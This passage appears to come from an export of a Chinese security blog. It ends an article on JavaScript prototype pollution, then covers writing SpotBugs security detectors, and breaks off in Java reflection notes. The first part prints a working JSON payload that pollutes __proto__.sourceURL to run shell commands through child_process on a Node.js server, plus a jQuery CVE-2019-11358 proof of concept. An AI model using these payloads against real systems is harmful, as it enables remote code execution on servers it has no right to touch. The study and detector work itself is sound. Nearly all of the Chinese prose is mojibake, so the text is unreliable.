class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹æ‰€ä»¥å°†sourceURLçš„è¿”å›å€¼å®šä¹‰ä¸ºâ€œå¦ä¸€ä¸ªå‡½æ•°â€ï¼Œå†ç”±â€œå¦ä¸€ä¸ªå‡½æ•°â€è¿”å›ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç»“æœï¼Œæ˜¯å› ä¸ºåŸæœ¬çš„è®¾è®¡<code>Function(importsKeys, sourceURL + &#39;return &#39; + source)</code>ä¸­çš„sourceå°±æ˜¯è¿”å›ä¸€ä¸ªfunctionçš„ï¼Œå› ä¸ºç°åœ¨æå‰returnï¼Œè€ƒè™‘å¹‚ç­‰åŸç†ï¼Œä¿®æ”¹åçš„è¿”å›ä¹Ÿè¦æ˜¯function</p><p>æ‰§è¡Œç»“æœå¦‚ä¸‹</p><p><img src="/JS-åŸå‹é“¾æ±¡æŸ“/1556111648655.png" alt="1556111648655"></p><p>æ³¨æ„ï¼Œpingå‘½ä»¤ä¸èƒ½ç”¨ï¼Œå› ä¸ºnodejsæ²¡æœ‰æƒé™ï¼ŒContent-Typeéœ€è¦æ”¹ä¸ºjsonï¼ˆnodejsé»˜è®¤æ¥å—jsonæ ¼å¼ï¼‰ã€‚</p><h2 id="ä¼˜åŒ–payload"><a href="#ä¼˜åŒ–payload" class="headerlink" title="ä¼˜åŒ–payload"></a>ä¼˜åŒ–payload</h2><p>ä¸Šé¢çš„payloadå·²ç»å¯ä»¥æ”»å‡»æˆåŠŸï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªå¼Šç«¯å°±æ˜¯åœ¨ç¨‹åºé‡å¯ä¹‹å‰ï¼Œæ•´ä¸ªåŸå‹é“¾éƒ½ä¼šå—åˆ°æ±¡æŸ“å¸¦æ¥çš„å½±å“ï¼Œå¯¼è‡´åé¢ç”¨æˆ·å› ä¸ºåŸå‹å·²ç»è¢«æ±¡æŸ“è€Œæ— æ³•è·å–æ­£å¸¸æœåŠ¡ï¼š</p><p><img src="/JS-åŸå‹é“¾æ±¡æŸ“/1556973914607.png" alt="1556973914607"></p><p>éœ€è¦ç”¨forå¾ªç¯æŠŠä¹‹å‰çš„æ±¡æŸ“åˆ æ‰ï¼Œè¿™ä¹Ÿå°±æˆäº†pç¥å¸–å­é‡Œé¢çš„payloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\u000areturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>é¢˜å¤–è¯ï¼Œå½“æ—¶æ²¡æƒ³æ¸…æ¥šä¸ºå•¥åœ¨returnä¹‹å‰åˆ é™¤å¯ä»¥åœ¨åé¢åˆ é™¤æ±¡æŸ“ï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªç®€å•çš„å…ˆåé—®é¢˜ï¼Œå³åœ¨requestçš„æ—¶å€™ï¼Œæˆ‘ä»¬æ±¡æŸ“äº†<code>sourceURL</code>ï¼Œæ¥ç€é€ æˆä»£ç æ‰§è¡Œï¼ˆå…ˆï¼‰ï¼Œåœ¨æ‰§è¡Œæ—¶ï¼Œæ±¡æŸ“æºè¢«æ¸…é™¤ï¼ˆåï¼‰ï¼Œè¿”å›ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç»“æœï¼Œè¿™æ ·ä¹‹åçš„è°ƒç”¨å°±ä¸ä¼šå—åˆ°åŸå‹é“¾æ±¡æŸ“çš„å½±å“äº†ã€‚</p><h1 id="jQueryçš„åŸå‹æ±¡æŸ“-CVE-2019-11358"><a href="#jQueryçš„åŸå‹æ±¡æŸ“-CVE-2019-11358" class="headerlink" title="jQueryçš„åŸå‹æ±¡æŸ“(CVE-2019-11358)"></a>jQueryçš„åŸå‹æ±¡æŸ“(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11358" target="_blank" rel="noopener">CVE-2019-11358</a>)</h1><p>jQuery 3.4.0ä»¥ä¸‹ç‰ˆæœ¬ï¼ˆä¸åŒ…æ‹¬3.4.0ï¼‰å­˜åœ¨åŸå‹æ±¡æŸ“æ¼æ´ã€‚ä¸»è¦åŸå› å¯ä»¥å‚è€ƒå¥‡å®‰ä¿¡ä»£ç å«å£«çš„â€œ<a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">jQuery CVE-2019-11358 åŸå‹æ±¡æŸ“æ¼æ´åˆ†æå’Œä¿®å¤å»ºè®®</a>â€ä¸€æ–‡ã€‚</p><p>Sinkå‡ºç°åœ¨src/core.jsä»£ç jQuery.extendå‡½æ•°çš„<a href="https://github.com/jquery/jquery/blob/3.3.1/src/core.js#L155" target="_blank" rel="noopener">180-185è¡Œ</a>ï¼š</p><p><img src="/JS-åŸå‹é“¾æ±¡æŸ“/1557061047384.png" alt="1557061047384"></p><p>180è¡Œæ˜¯ä¸€ä¸ªé€’å½’è°ƒç”¨ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°extend()å‚æ•°æœ‰deepï¼Œcloneï¼Œcopyä¸‰ä¸ªï¼Œæ¥ç€<code>target[name]=copy</code>ä¸­ï¼Œå¦‚æœnameå’Œcopyå¯æ§çš„è¯å°±å¯ä»¥è¿›è¡Œæ±¡æŸ“äº†ã€‚</p><p>è¿™ä¸¤ä¸ªå˜é‡å½“ç„¶æ˜¯å¯æ§çš„ï¼Œå‘ä¸Šçœ‹åˆ°155-160è¡Œï¼š</p><p><img src="/JS-åŸå‹é“¾æ±¡æŸ“/1557061924872.png" alt="1557061924872"></p><p>argumentså°±æ˜¯ä¼ è¿›æ¥çš„å‚æ•°ï¼Œå…ˆèµ‹å€¼ç»™optionsï¼Œæ¥ç€optionsçš„keyå°±æ˜¯nameï¼Œvalueå°±æ˜¯copyã€‚</p><p>å› æ­¤å¯ä»¥æ„é€ å¦‚ä¸‹PoCï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode": true&#125;&#125;'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.devMode); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä¹‹æ‰€ä»¥è¯´jQueryåŸå‹æ±¡æŸ“çš„å½±å“ä¸å¤§ï¼Œæ˜¯å› ä¸ºè¿™æ˜¯ä¸€ä¸ªå‰ç«¯æ¼æ´ï¼Œå³ä½¿æœ‰æ¼æ´ï¼Œæ”»å‡»è€…ä¹Ÿéœ€è¦æ ¹æ®ç½‘ç«™ï¼ˆæºç å®¡è®¡ï¼‰äº§ç”ŸEXPï¼Œå½“ç„¶ï¼Œå¦‚æœç½‘ç«™ä¾èµ–äºæŸäº›ç±»çš„æŸäº›å±æ€§/æ–¹æ³•åšèº«ä»½éªŒè¯æˆ–å…¶ä»–çš„ä»€ä¹ˆäº‹æƒ…ï¼ˆä¾‹å¦‚PoCé‡Œçš„devModeï¼‰ï¼Œé‚£ä¹ˆåæœè¿˜æ˜¯å¾ˆä¸¥é‡çš„ã€‚</p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li><p>JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œ<a href="https://xz.aliyun.com/t/2735" target="_blank" rel="noopener">https://xz.aliyun.com/t/2735</a></p></li><li><p>æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»ï¼Œ<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p></li><li><p>After three years of silence, a new jQuery prototype pollution vulnerability emerges once againï¼Œ<a href="https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/" target="_blank" rel="noopener">https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/</a></p></li><li><p>jQuery CVE-2019-11358 åŸå‹æ±¡æŸ“æ¼æ´åˆ†æå’Œä¿®å¤å»ºè®®, <a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177093</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> jQuery </tag>
            
            <tag> åŸå‹é“¾æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spotbugsæºç å­¦ä¹ &amp;æ·»åŠ å®‰å…¨è§„åˆ™</title>
      <link href="/whitebox-spotbugs%E6%B7%BB%E5%8A%A0%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%99/"/>
      <url>/whitebox-spotbugs%E6%B7%BB%E5%8A%A0%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºå¸®æˆ‘å†…æ¨é˜¿é‡Œçš„å¸ˆå‚…å‘Šè¯‰æˆ‘ä»¥åå¯èƒ½è¦åšæºç å®¡è®¡çš„å·¥ä½œï¼Œå…ˆå­¦ä¹ ä¸€ä¸‹spotbugså’Œ<a href="https://find-sec-bugs.github.io/" target="_blank" rel="noopener">find-sec-bugs</a>çš„æ‰«æè§„åˆ™å®ç°ï¼Œå¹¶ä¸”å°è¯•æ·»åŠ ä¸€ä¸ªè§„åˆ™ã€‚</p><h1 id="æ·»åŠ æ‰«æè§„åˆ™â€”â€”æ·»åŠ ä¸€ä¸ªDetector"><a href="#æ·»åŠ æ‰«æè§„åˆ™â€”â€”æ·»åŠ ä¸€ä¸ªDetector" class="headerlink" title="æ·»åŠ æ‰«æè§„åˆ™â€”â€”æ·»åŠ ä¸€ä¸ªDetector"></a>æ·»åŠ æ‰«æè§„åˆ™â€”â€”æ·»åŠ ä¸€ä¸ªDetector</h1><p>æ·»åŠ æ‰«æè§„åˆ™ä¸»è¦æ˜¯ç»§æ‰¿Detectorï¼Œæœ¬æ–‡ä»‹ç»ä»¥ä¸‹å‡ ç§ä¸»è¦çš„Detectorï¼š</p><a id="more"></a><h2 id="OpcodeStackDetector"><a href="#OpcodeStackDetector" class="headerlink" title="OpcodeStackDetector"></a>OpcodeStackDetector</h2><p>æ£€æŸ¥æ¯ä¸€ä¸ªJavaè™šæ‹Ÿæœºæ“ä½œç ï¼ˆç»§æ‰¿å…¶ä¸­çš„<code>sawOpcode(int seen)</code>ï¼Œ<code>seen</code>å³æ“ä½œå—intè¡¨ç¤ºï¼‰ï¼Œå…¶ä¸­å¯ä»¥è·å–è°ƒç”¨çš„æ–¹æ³•åâ€”â€”<code>getNameConstantOperand()</code>ï¼Œè·å–è°ƒç”¨è€…â€”â€”<code>getClassConstantOperand()</code>ï¼Œè·å–å‡½æ•°è°ƒç”¨çš„å‚æ•°â€”â€”<code>stack.getStackItem(0)</code>ã€‚å¯ä»¥åšç±»ä¼¼äºæ­£åˆ™åŒ¹é…çš„ç®€å•æ‰«æå·¥å…·ã€‚</p><p>ä¾‹å¦‚æ‰«æ<code>registry.addMapping.addMapping(&quot;/**&quot;).allowedOrigins(&quot;*&quot;)</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsRegistryCORSDetector</span> <span class="keyword">extends</span> <span class="title">OpcodeStackDetector</span> </span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sawOpcode</span><span class="params">(<span class="keyword">int</span> seen)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//æ£€æµ‹è°ƒç”¨æ–¹æ³•å</span></span><br><span class="line">        <span class="keyword">if</span> (seen == Const.INVOKEVIRTUAL &amp;&amp; getNameConstantOperand().equals(<span class="string">"allowedOrigins"</span>)) &#123;</span><br><span class="line">            <span class="comment">// æ£€æµ‹è°ƒç”¨å¯¹è±¡</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"org/springframework/web/servlet/config/annotation/CorsRegistration"</span>.equals(getClassConstantOperand())) &#123;</span><br><span class="line">                OpcodeStack.Item item = stack.getStackItem(<span class="number">0</span>);</span><br><span class="line">                <span class="comment">// å› ä¸ºallowedOriginså‚æ•°æ—¶Strings... æ‰€ä»¥ä¸èƒ½ç›´æ¥æå–è€Œéœ€è¦è‡ªå·±é€šè¿‡å­—èŠ‚ç æå–</span></span><br><span class="line">                <span class="keyword">if</span>(item.isArray()) &#123;</span><br><span class="line">                    String[] strings=getStringArray(item);</span><br><span class="line">                    String pattern=<span class="string">"*"</span>;</span><br><span class="line">                    <span class="keyword">for</span> (String s: strings) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (s.equals(pattern)) &#123;</span><br><span class="line">                             bugReporter.reportBug(<span class="keyword">new</span> BugInstance(<span class="keyword">this</span>, <span class="string">"PERMISSIVE_CORS"</span>, HIGH_PRIORITY)</span><br><span class="line">                        .addClassAndMethod(<span class="keyword">this</span>).addSourceLine(<span class="keyword">this</span>));</span><br><span class="line">                             <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæ˜¯æˆ‘ä¸ºfind-sec-bugsæäº¤çš„ä¸€ä¸ªçœŸå®çš„Detectorï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå‘å°±æ˜¯<code>allowedOrigins()</code>æ–¹æ³•çš„å‚æ•°æ˜¯å˜é•¿å‚æ•°ï¼ˆå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ•°ç»„ï¼‰ï¼Œå¦‚æœå‚æ•°æ˜¯Stringæˆ–æ˜¯å®šé•¿å‚æ•°çš„è¯ï¼Œç›´æ¥ç”¨<code>stack.getStackItem(0)</code>å°±å¯ä»¥æ‹¿åˆ°å‚æ•°äº†ï¼Œç°åœ¨çš„è¯å°±éœ€è¦è‡ªå·±å†™<code>getStringArray(item)</code>æ–¹æ³•ï¼Œå…·ä½“è§£å†³ä»£ç è§<a href="https://github.com/find-sec-bugs/find-sec-bugs/pull/472" target="_blank" rel="noopener">find-sec-bugs#472</a></p><h2 id="BasicInjectionDetector"><a href="#BasicInjectionDetector" class="headerlink" title="BasicInjectionDetector"></a>BasicInjectionDetector</h2><p>è¯¥Detectorä»¥æ¯æ¬¡è°ƒç”¨ï¼ˆinvokeï¼‰ä¸ºå•ä½è¿›è¡Œä»£ç å®¡è®¡ï¼Œé€šè¿‡æ±¡ç‚¹ä¼ æ’­æŠ€æœ¯ï¼Œåˆ¤æ–­è°ƒç”¨æ•æ„Ÿå‡½æ•°æ—¶åˆ¤æ–­å‚æ•°æ˜¯å¦ä¸ºç”¨æˆ·å¯æ§ï¼ˆå¯ä»¥å‚è€ƒcom.h3xstream.findsecbugs.file.PathTraversalDetector.javaï¼‰</p><p>ä¹Ÿå¯ç»§æ‰¿åé‡å†™getInjectionPoint()å’ŒgetPriorityFromTaintFrame()æ–¹æ³•ï¼Œç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨è°ƒç”¨ä»¥åŠåˆ¤æ–­é£é™©ç­‰çº§ï¼Œè¿™æ—¶é€€åŒ–æˆOpcodeStackDetectorï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬è¦æ£€æµ‹CORSæ¼æ´ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsRegistryCORSDetector</span> <span class="keyword">extends</span> <span class="title">BasicInjectionDetector</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PERMISSIVE_CORS = <span class="string">"PERMISSIVE_CORS"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CORS_REGISTRY_CLASS = <span class="string">"org.springframework.web.servlet.config.annotation.CorsRegistration"</span>;</span><br><span class="line">    <span class="comment">// éœ€è¦è·å–å‡½æ•°åŸå‹</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> InvokeMatcherBuilder CORS_REGISTRY_ALLOWED_ORIGINS_METHOD = invokeInstruction()</span><br><span class="line">            .atClass(CORS_REGISTRY_CLASS).atMethod(<span class="string">"allowedOrigins"</span>)</span><br><span class="line">            .withArgs(<span class="string">"([Ljava/lang/String;)Lorg/springframework/web/servlet/config/annotation/CorsRegistration;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CorsRegistryCORSDetector</span><span class="params">(BugReporter bugReporter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(bugReporter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ¯æ¬¡è°ƒç”¨æ—¶éƒ½ä¼šç”¨è¯¥å‡½æ•°åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´</span></span><br><span class="line"><span class="comment">     * invokeï¼šè¡¨ç¤ºä¸€æ¬¡è°ƒç”¨</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> InjectionPoint <span class="title">getInjectionPoint</span><span class="params">(InvokeInstruction invoke, ConstantPoolGen cpg,</span></span></span><br><span class="line"><span class="function"><span class="params">            InstructionHandle handle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">assert</span> invoke != <span class="keyword">null</span> &amp;&amp; cpg != <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// å¯ä»¥é€šè¿‡ä¸€ä¸‹æ–¹æ³•è·å–InvokeMatcherBuilderçš„classã€methodã€Signature</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getClassName(cpg));</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getMethodName(cpg));</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getSignature(cpg));</span></span><br><span class="line">        <span class="keyword">if</span> (CORS_REGISTRY_ALLOWED_ORIGINS_METHOD.matches(invoke, cpg)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InjectionPoint(<span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">0</span> &#125;, PERMISSIVE_CORS);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> InjectionPoint.NONE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¿”å›å±é™©ç­‰çº§</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">getPriorityFromTaintFrame</span><span class="params">(TaintFrame fact, <span class="keyword">int</span> offset)</span> <span class="keyword">throws</span> DataflowAnalysisException </span>&#123;</span><br><span class="line">        <span class="comment">// Get the value of the Access-Control-Allow-Origin parameter (Second argument from setHeader(2nd,1rst))</span></span><br><span class="line">        Taint  originsTaint= fact.getStackValue(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (originsTaint.getConstantOrPotentialValue().contains(<span class="string">"*"</span>)) &#123; <span class="comment">//Ignore unknown/dynamic header name</span></span><br><span class="line">            <span class="keyword">return</span> Priorities.HIGH_PRIORITY;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Priorities.IGNORE_PRIORITY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œ<code>getPriorityFromTaintFrame()</code>æ–¹æ³•å†™çš„æ˜¯æœ‰é—®é¢˜çš„ï¼Œè¿˜æ˜¯å› ä¸ºå˜é•¿å‚æ•°é—®é¢˜ï¼Œå¯¼è‡´<code>originsTaint.getConstantOrPotentialValue()</code>åªèƒ½å¾—åˆ°æ•°ç»„é•¿åº¦å´ä¸èƒ½æ‹¿åˆ°å†…å®¹ã€‚</p><p>è¿™é‡Œç¬¬äºŒä¸ªéš¾ç‚¹å°±æ˜¯è·å–å‡½æ•°åŸå‹ï¼Œå¯ä»¥è€ƒè™‘æ˜¯ç”¨javapï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -cp C:\Users\x5651\.m2\repository\org\springframework\spring-webmvc\5.1.6.RELEASE\spring-webmvc-5.1.6.RELEASE.jar -s org.springframework.web.servlet.config.annotation.CorsRegistration</span><br></pre></td></tr></table></figure></p><h3 id="å¢åŠ ä¸€ä¸ªç®€å•çš„æ±¡ç‚¹ä¼ æ’­è§„åˆ™"><a href="#å¢åŠ ä¸€ä¸ªç®€å•çš„æ±¡ç‚¹ä¼ æ’­è§„åˆ™" class="headerlink" title="å¢åŠ ä¸€ä¸ªç®€å•çš„æ±¡ç‚¹ä¼ æ’­è§„åˆ™"></a>å¢åŠ ä¸€ä¸ªç®€å•çš„æ±¡ç‚¹ä¼ æ’­è§„åˆ™</h3><p>ä¸€ä¸ªç®€å•çš„æ±¡ç‚¹ä¼ æ’­åªéœ€è¦å®šä¹‰sinkç‚¹å’Œpriorityå°±è¡Œäº†ï¼Œä»¥å‘½ä»¤æ³¨å…¥çš„è§„åˆ™ä¸ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandInjectionDetector</span> <span class="keyword">extends</span> <span class="title">BasicInjectionDetector</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommandInjectionDetector</span><span class="params">(BugReporter bugReporter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(bugReporter);</span><br><span class="line">        loadConfiguredSinks(<span class="string">"command.txt"</span>, <span class="string">"COMMAND_INJECTION"</span>);</span><br><span class="line">        loadConfiguredSinks(<span class="string">"command-scala.txt"</span>, <span class="string">"SCALA_COMMAND_INJECTION"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">getPriority</span><span class="params">(Taint taint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!taint.isSafe() &amp;&amp; taint.hasTag(Taint.Tag.COMMAND_INJECTION_SAFE)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Priorities.IGNORE_PRIORITY;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.getPriority(taint);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æºç å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> æºç å®‰å…¨ </tag>
            
            <tag> Spotbugs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaåå°„å­¦ä¹ ç¬”è®°</title>
      <link href="/java-java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/java-java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="è·å–ç±»å¯¹è±¡"><a href="#è·å–ç±»å¯¹è±¡" class="headerlink" title="è·å–ç±»å¯¹è±¡"></a>è·å–ç±»å¯¹è±¡</h1><h2 id="åŠ¨æ€åŠ è½½ä¸€ä¸ªç±»"><a href="#åŠ¨æ€åŠ è½½ä¸€ä¸ªç±»" class="headerlink" title="åŠ¨æ€åŠ è½½ä¸€ä¸ªç±»"></a>åŠ¨æ€åŠ è½½ä¸€ä¸ªç±»</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL[] urls = <span class="keyword">new</span> URL[] &#123;<span class="keyword">new</span> URL(<span class="string">"file:.\\out\\production\\java_reflect"</span>)&#125;;</span><br><span class="line">URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">Class clazz = classLoader.loadClass(<span class="string">"test.reflect.User"</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="å¯»æ‰¾ä¸€ä¸ªç±»"><a href="#å¯»æ‰¾ä¸€ä¸ªç±»" class="headerlink" title="å¯»æ‰¾ä¸€ä¸ªç±»"></a>å¯»æ‰¾ä¸€ä¸ªç±»</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"test.reflect.User"</span>);</span><br></pre></td></tr></table></figure><h1 id="è·å–ç±»ä¸­çš„æ„é€ æ–¹æ³•"><a href="#è·å–ç±»ä¸­çš„æ„é€ æ–¹æ³•" class="headerlink" title="è·å–ç±»ä¸­çš„æ„é€ æ–¹æ³•"></a>è·å–ç±»ä¸­çš„æ„é€ æ–¹æ³•</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor1=clazz.getConstructor();</span><br><span class="line">User user1 = (User) constructor1.newInstance();</span><br><span class="line"></span><br><span class="line">Constructor constructor2=clazz.getConstructor(String<span class="class">.<span class="keyword">class</span>, <span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">User user2 = (User) constructor2.newInstance(<span class="string">"lili"</span>, <span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure><h1 id="è·å–ç±»ä¸­å±æ€§"><a href="#è·å–ç±»ä¸­å±æ€§" class="headerlink" title="è·å–ç±»ä¸­å±æ€§"></a>è·å–ç±»ä¸­å±æ€§</h1><h2 id="è·å–ç±»ä¸­å…¬æœ‰å±æ€§"><a href="#è·å–ç±»ä¸­å…¬æœ‰å±æ€§" class="headerlink" title="è·å–ç±»ä¸­å…¬æœ‰å±æ€§"></a>è·å–ç±»ä¸­å…¬æœ‰å±æ€§</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Field usernameField=clazz.getField(<span class="string">"username"</span>);</span><br><span 